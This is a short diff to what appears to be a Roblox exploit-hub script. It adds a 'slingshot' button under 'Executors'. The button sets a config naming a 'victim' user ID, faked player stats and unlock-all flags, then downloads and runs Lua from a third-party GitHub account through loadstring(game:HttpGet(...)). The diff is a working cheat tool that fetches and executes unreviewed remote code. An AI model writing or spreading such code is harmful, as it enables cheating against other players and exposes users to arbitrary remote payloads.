@@ -62,6 +62,26 @@ MainTab:CreateButton({
 MainTab:CreateSection("Executors")
 
 MainTab:CreateButton({
+   Name = "slingshot",
+   Callback = function()
+       getgenv().Config = {
+           victim = 719253194,
+           helper = "",
+           level = 456,
+           streak = 1927,
+           elo = 0,
+           keys = 1000,
+           premium = true,
+           verified = true,
+           unlockall = true,
+           platform = "DESKTOP",
+           join = "discord.gg/rivalscomp"
+       }
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
+   end,
+})
+
+MainTab:CreateButton({
    Name = "Jvke",
    Callback = function()
        getgenv().Config = {
